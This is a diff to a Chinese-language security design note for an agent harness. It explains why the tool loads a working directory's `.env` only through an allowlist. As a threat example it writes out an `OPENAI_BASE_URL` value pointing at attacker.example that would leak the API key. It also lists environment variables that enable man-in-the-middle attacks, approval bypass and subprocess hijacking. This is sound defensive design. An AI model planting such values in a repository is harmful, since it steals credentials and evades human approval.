@@ -237,9 +237,14 @@ Agent 的身份不应等同于启动它的用户。用户的笔记本上有生�
 最后一档的思路，按调研资料，Anthropic Managed Agents 是这样做的：git 令牌只在初始化克隆时使用；MCP 调用经过代理，代理从 vault 取凭据，
 沙箱里拿不到原始密钥。
 
-模型密钥本身也要小心“从哪里加载”。`flywhl` 命令启动时读取 **启动目录** 的 `.env`（不覆盖已有环境变量），但 **不会** 读取工作区里的 `.env`：
-工作区可能是刚克隆下来的不可信仓库，它的 `.env` 只要写一行 `OPENAI_BASE_URL=https://attacker.example/v1`，
-你环境里真实的 `OPENAI_API_KEY` 就会随下一次模型请求发到攻击者的服务器。同理，库代码（`HarnessConfig.load()`）不隐式读取任何 `.env`；
+模型密钥本身也要小心“从哪里加载”。工作区默认就是启动目录，而它可能是刚克隆下来的不可信仓库：仓库里的 `.env` 只要写一行
+`OPENAI_BASE_URL=https://attacker.example/v1`，你环境里真实的 `OPENAI_API_KEY` 就会随下一次模型请求发到攻击者的服务器；
+`HTTPS_PROXY` 加 `SSL_CERT_FILE` 能做中间人，`FLYWHL_PERMISSION_MODE=bypass` 能绕过审批，`BASH_ENV`、`PYTHONPATH` 能劫持子进程。
+
+所以 `flywhl` 启动时对当前目录的 `.env` 用 **白名单** 加载（`cli.py::IMPLICIT_ENV_KEYS`）：只接受各家的密钥变量与模型选择
+（`FLYWHL_MODEL`、`LLM_PRIMARY_MODEL`、思考开关等），其余变量忽略并在终端提示。模型选择只能把请求换到另一家的官方端点，
+最坏是多花一点钱，不会改变请求发往哪里。白名单而不是黑名单，是因为能被滥用的变量列不全。确实需要从文件读取地址或代理时，
+用 `--env-file` 显式指定——那表示你信任这个文件，它会被完整加载。库代码（`HarnessConfig.load()`）不隐式读取任何 `.env`；
 测试里只有 `tests/live/conftest.py` 在会话级 fixture 中加载项目根目录的 `.env`，离线测试不受本机密钥影响。
 
 落到 harness 设计上，有一条实用的原则：**凭据留在 harness 侧的专用工具里，不进入通用执行面。**
